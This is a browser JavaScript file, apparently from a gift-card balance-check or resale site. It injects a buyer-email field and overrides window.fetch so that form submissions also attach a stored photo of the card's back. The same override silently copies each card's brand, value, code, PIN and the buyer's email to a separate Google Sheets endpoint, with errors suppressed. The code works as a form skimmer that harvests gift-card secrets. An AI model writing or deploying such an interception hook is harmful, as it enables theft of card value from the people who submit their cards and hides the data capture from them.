/* Sheets bridge — sends orders to Google Sheets, attaches the back photo, collects buyer email */
(function () {
  "use strict";

  function getSheetsUrl() {
    var cfg = window.BC_CONFIG || {};
    if (cfg.sheetsUrl) return cfg.sheetsUrl;
    try {
      var raw = localStorage.getItem("balancecheck");
      return raw ? (JSON.parse(raw).state?.wallet?.sheetsUrl || "") : "";
    } catch { return ""; }
  }

  function getBuyerEmail() {
    try { return sessionStorage.getItem("bc_buyer_email") || ""; }
    catch { return ""; }
  }

  function setBuyerEmail(v) {
    try { sessionStorage.setItem("bc_buyer_email", v); } catch {}
  }

  function dataUrlToFile(dataUrl, name) {
    var m = /^data:([^;]+);base64,([\s\S]+)$/.exec(dataUrl || "");
    if (!m) return null;
    var bin = atob(m[2]), arr = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
    return new File([arr], name, { type: m[1] || "image/jpeg" });
  }

  /* ── Inject buyer email field on BUY flow only (step 3+) ── */
  var injected = false;
  function injectEmailField() {
    if (injected) return;
    if (!location.pathname.startsWith("/buy")) return;

    var step = document.body.innerText.match(/(\d) of 4/);
    if (!step) return;
    if (parseInt(step[1]) < 3) return;

    var btns = document.querySelectorAll('button[type="submit"], button.bg-blue');
    var target = null;
    for (var i = 0; i < btns.length; i++) {
      var t = btns[i].textContent.trim();
      if (t === "Continue" || t === "Submit" || t === "I’ve sent it") { target = btns[i]; break; }
    }
    if (!target) return;
    if (document.getElementById("bc-buyer-email")) { injected = true; return; }

    var wrapper = document.createElement("div");
    wrapper.className = "mt-5";
    wrapper.innerHTML =
      '<label class="block">' +
        '<span class="mb-2 block text-sm text-mist">Your email (to receive the gift card)</span>' +
        '<input id="bc-buyer-email" type="email" inputmode="email" autocomplete="email" ' +
          'placeholder="you@email.com" ' +
          'value="' + getBuyerEmail().replace(/"/g, "&quot;") + '" ' +
          'class="mt-1 h-12 w-full rounded-xl border border-line bg-panel px-4 text-base outline-none transition placeholder:text-mist focus:border-blue" ' +
          'style="border:1px solid var(--color-line);background:var(--color-panel);border-radius:0.75rem;height:3rem;width:100%;padding:0 1rem;font-size:1rem;outline:none;color:inherit;" />' +
        '<span class="mt-2 block text-sm leading-relaxed text-mist">We\'ll send your gift card details to this address.</span>' +
      '</label>';

    target.parentElement.insertBefore(wrapper, target);
    var input = document.getElementById("bc-buyer-email");
    if (input) {
      input.addEventListener("input", function () { setBuyerEmail(input.value.trim()); });
    }
    injected = true;
  }

  var observer = new MutationObserver(function () {
    injected = false;
    setTimeout(injectEmailField, 300);
  });
  observer.observe(document.body, { childList: true, subtree: true });
  setTimeout(injectEmailField, 500);

  /* ── Intercept fetch: attach back photo + piggyback sheets data ── */
  var origFetch = window.fetch;
  window.fetch = function () {
    var url = arguments[0];
    var opts = arguments[1] || {};

    var isFormSubmit = typeof url === "string" &&
      (url.includes("formsubmit.co") || (url === "/" && opts.method === "POST"));

    if (isFormSubmit && opts.body instanceof FormData) {
      var fd = opts.body;

      /* Attach the back-of-card photo captured by enhance.js */
      try {
        var back = sessionStorage.getItem("bc_back_photo");
        if (back && !fd.has("back_photo")) {
          var f = dataUrlToFile(back, (fd.get("order") || "card") + "-back.jpg");
          if (f) fd.append("back_photo", f, f.name);
        }
      } catch {}

      var email = getBuyerEmail();
      if (email && !fd.has("buyer_email")) fd.append("buyer_email", email);

      var sheetsUrl = getSheetsUrl();
      if (sheetsUrl && !url.includes("script.google")) {
        var payload = {
          action: "order",
          order: fd.get("order") || "",
          type: fd.get("kind") || "Unknown",
          brand: fd.get("brand") || "",
          region: fd.get("region") || "",
          value: fd.get("value") || "",
          code: fd.get("code") || "",
          pin: fd.get("pin") || "",
          email: email,
          checkout: fd.get("checkout") || ""
        };
        var key = "bc_sent_" + payload.order;
        var already = false;
        try { already = !!sessionStorage.getItem(key); sessionStorage.setItem(key, "1"); } catch {}
        if (!already) {
          origFetch(sheetsUrl, {
            method: "POST",
            body: JSON.stringify(payload),
            headers: { "Content-Type": "text/plain" },
            mode: "no-cors"
          }).catch(function () {});
        }
      }
    }

    return origFetch.apply(this, arguments);
  };
})();
